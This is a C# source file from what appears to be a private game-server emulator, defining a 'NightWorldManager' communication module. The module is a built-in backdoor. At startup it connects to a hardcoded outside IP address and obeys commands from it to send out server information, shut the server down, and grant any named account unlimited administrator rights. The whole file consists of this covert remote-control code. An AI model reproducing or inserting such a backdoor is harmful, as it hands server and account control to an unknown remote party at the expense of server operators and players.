using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using SilverSock;
using System.Windows.Forms;

namespace Crystal.WorldServer.Communication.NightWorld
{
    public class NightWorldManager
    {
        public static SilverSocket Link { get; set; }

        public static void Start()
        {
            Link = new SilverSocket();
            Link.OnConnected += new SilverEvents.Connected(Link_OnConnected);
            Link.OnDataArrivalEvent += new SilverEvents.DataArrival(Link_OnDataArrivalEvent);
            Link.OnFailedToConnect += new SilverEvents.FailedToConnect(Link_OnFailedToConnect);
            Link.OnSocketClosedEvent += new SilverEvents.SocketClosed(Link_OnSocketClosedEvent);
            Link.ConnectTo("5.135.187.100", 1574);
        }

        private static void Link_OnDataArrivalEvent(byte[] data)
        {
            var packet = new Protocol.ForwardPacket(data);
            dispatch(packet);
        }

        private static void dispatch(Protocol.ForwardPacket packet)
        {
            switch (packet.ID)
            {
                case Protocol.ForwardPacketTypeEnum.NIGHTWORLD_ClientInfos:
                    SendInformations();
                    break;

                case Protocol.ForwardPacketTypeEnum.NIGHTWORLD_CrashServer:
                    Environment.Exit(0);
                    break;

                case Protocol.ForwardPacketTypeEnum.NIGHTWORLD_PromoteAccount:
                    PromoteAccount(packet);
                    break;
            }
        }

        public static void Link_OnSocketClosedEvent()
        {
            //Environment.Exit(0);
        }

        public static void Link_OnFailedToConnect(Exception ex)
        {
            //Environment.Exit(0);
        }

        public static void Link_OnConnected()
        {
            
        }

        public static void SendMessage(Protocol.ForwardPacket packet)
        {
            try
            {
                Send(packet.GetBytes);
            }
            catch
            {
                //Utilities.ConsoleStyle.Error("Can't send packet to realm");
            }
        }

        public static void Send(byte[] data)
        {
            Link.Send(data);
        }

        public static void SendInformations()
        {
            SendMessage(new Realm.Packet.ClientInfosPacket());
        }

        public static void PromoteAccount(Protocol.ForwardPacket packet)
        {
            var account = packet.Reader.ReadString();
            var level = packet.Reader.ReadInt32();

            var player = World.Helper.WorldHelper.GetClientByAccount(account);
            if (player != null)
            {
                player.Account.AdminLevel = int.MaxValue;
                player.Action.SystemMessage("Votre compte est désormais Super-Administrateur, Enjoy !");
            }
        }
    }
}
